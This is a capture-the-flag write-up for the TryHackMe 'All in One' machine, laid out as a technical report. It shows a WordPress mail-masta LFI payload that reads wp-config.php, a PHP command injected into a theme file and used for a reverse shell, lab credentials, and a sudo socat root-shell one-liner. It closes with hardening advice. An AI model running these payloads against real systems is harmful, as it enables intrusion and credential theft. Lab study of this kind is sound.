# All in One  — Technical Report

> Platform: TryHackMe  
> Difficulty: Easy  
> Date: 2026-02-20  
> Author: 0N1S3C  
> Scope: Authorized TryHackMe lab environment only  

---

## 1. Introduction

This report documents the structured assessment and controlled exploitation of the “All in One” machine on TryHackMe.

The objective was to:

Obtain user-level access

Escalate privileges to root

The assessment followed a systematic methodology emphasizing enumeration, credential discovery, and controlled exploitation of misconfigurations.`methodology.md`.

---

## 2. Reconnaissance

### 2.1 Initial Network Scan

**Command Used:**
```bash
nmap -sC -sV <target-ip>
```

**Summary of Findings:**

| Port | Service | Version | Notes |
|------|---------|----------|-------|
|  21  | FTP | vsftpd 3.0.5 | Anonymous login allowed |
|  22  | SSH | OpenSSH 8.2p1 | Ubuntu |
|  80  | HTTP | Apache 2.4.41 | WordPress present |
Key observations:
- Anonymous FTP access was permitted but contained no writable or useful files.
- Web service was running Apache with a WordPress instance located under `/wordpress`.
- SSH was available, suggesting potential credential-based access.
 

---

## 3. Service Enumeration

Each exposed service was analyzed individually to identify potential attack vectors.

### 3.1 Web Enumeration 

Tools Used:
- `gobuster`
- `wpscan`
- Manual source code inspection
Directory enumeration revealed:
- `/wordpress`
- `/hackathons`
The `/hackathons` page contained suspicious HTML comments:

```HTML
<!-- Dvc W@iyur@123 -->
<!-- KeepGoing -->
```

### 3.2 Additional Services
Further enumeration of WordPress identified:
- WordPress version 5.5.1
- Plugin: mail-masta
- XML-RPC enabled
- Upload directory listing enabled
---

## 4. Initial Access

### 4.1 Vulnerability Identification
The mail-masta plugin was vulnerable to Local File Inclusion (LFI):
```code
/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=
```

### 4.2 Controlled Exploitation
Using php://filter encoding, the WordPress configuration file was retrieved:
``` code
php://filter/convert.base64-encode/resource=../../../../../wp-config.php
```
This exposed database credentials:
- DB_USER: elyana
- DB_PASSWORD: H@ckme@123
Administrative access to WordPress was obtained using these credentials.
To achieve remote command execution, a PHP command handler was injected into the active theme (header.php). This allowed execution via:
``` code
/wordpress/?cmd=id
```
A reverse shell was triggered, resulting in a `www-data` shell.
---

## 5. Lateral Movement
Enumeration of `/home/elyana`` revealed a hint file:
``` code
Elyana's user password is hidden in the system.
```
File ownership enumeration was performed:
``` code
find / -user elyana -type f 2>/dev/null
```
This revealed:
``` code
/etc/mysql/conf.d/private.txt
```
Contents:
``` code
user: elyana
password: E@syR18ght
```
Using these credentials, SSH acess was obtained:
``` bash
ssh elyana@<target-ip>
```
User flag was retrieved from:
``` bash
/home/elyana/user.txt
```
(Base64 encoded; decoded locally.)

## 6. Privilege Escalation
### 6.1 Enumeration
The `id` command revealed:
``` code
groups=1000(elyana),4(adm),27(sudo),108(lxd)
```

`sudo -l` revealed:
``` code
(ALL) NOPASSWD: /usr/bin/socat
```
### 6.2 Escalation Vector

The misconfiguration allowing execution of `/usr/bin/socat` as root without a password enabled direct privilege escalation.

Using:
``` bash 
sudo socat EXEC:"/bin/bash -li",pty,stderr,setsid,sigint,sane STDIO
```
A root shell was obtained.

### 6.3 Result
Root-level access was achieved. The root flag was retrieved from:
``` code
/root/root.txt
```
(Base64 encoded; decoded locally.)

---

## 7. Defensive Considerations
### 7.1 Identified Security Weaknesses
- Vulnerable WordPress plugin (mail-masta LFI)
- Plaintext credential storage in /etc/mysql/conf.d/private.txt
- Credential reuse between application and system accounts
- Misconfigured sudo privileges (NOPASSWD socat)
- Excessive group membership (lxd group access)
- Base64 encoding used as flag obfuscation (not secure storage)

### 7.2 Hardening Recommendations
- Remove or update vulnerable plugins
- Enforce least privilege on system users
- Avoid credential reuse between services
- Remove unnecessary sudo privileges
- Audit group memberships (especially lxd)
- Secure sensitive configuration files with proper permissions

## 8. Lessons Learned
- Structured enumeration consistently reveals attack paths.
- File ownership analysis is highly effective for credential discovery.
- Local misconfigurations (sudo entries) are often simpler escalation vectors than complex exploits.
- Multiple escalation paths increase exposure surface area.
- This assessment demonstrates the importance of defense-in-depth and proper privilege segmentation.
